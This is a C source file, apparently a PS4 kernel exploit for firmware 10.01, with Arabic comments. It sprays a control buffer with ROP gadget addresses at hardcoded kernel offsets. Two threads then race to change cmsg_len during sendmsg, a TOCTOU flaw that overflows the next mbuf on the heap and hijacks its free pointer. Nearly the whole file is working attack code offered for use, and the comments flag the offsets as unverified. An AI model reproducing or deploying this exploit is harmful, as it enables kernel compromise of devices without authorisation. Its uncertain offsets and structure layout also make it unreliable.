#include <ps4.h>

// Gadgets نسخة 10.01 (تأكد من الأوفستات الأصلية)
#define OFF_PUSH_RSP_POP_RSI_RET 0xbb3ee6 
#define OFF_POP_RAX_RET          0x29974f

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;

// بناء الـ Payload لدهس الـ mbuf التالي في الـ Heap
void build_heap_payload(uint64_t kbase) {
    uint64_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; 
    cmsg->cmsg_len = 0x50; // القيمة الشرعية التي تتجاوز الفحص الأول

    /* استراتيجية الإغراق (Heap Spraying):
       بما أننا لا نعرف الإزاحة الدقيقة لـ ext_free في الـ mbuf التالي،
       نقوم بملء المنطقة من 0x48 (نهاية الـ 0x50 بايت الأولى) بالعنوان المستهدف.
    */
    for (int i = 0x48; i < CONTROL_LEN - 8; i += 8) {
        *(uint64_t *)(control_buf + i) = trigger;
    }
}

// الخيط الذي يطلق syscall sendmsg
void *sendmsg_thread(void *arg) {
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        // الثغرة تكمن في freebsd32_copyin_control
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

// الخيط الذي يقوم بتغيير الطول (TOCTOU)
void *race_thread(void *arg) {
    while(1) {
        cmsg->cmsg_len = 0x50;   // تمر من الحلقة الأولى (Validation)
        cmsg->cmsg_len = 0xFFFF; // تسبب Overflow في الحلقة الثانية (Copying)
    }
    return NULL;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    build_heap_payload(kbase);

    // إنشاء Socket لتخصيص mbufs في الـ Heap
    global_sock = syscall(97, 2, 2, 0); // socket(AF_INET, SOCK_DGRAM, 0)

    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    // لن نصل هنا في الغالب لأن النظام سينهار أو ينفذ الكود
    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);

    return 0;
}
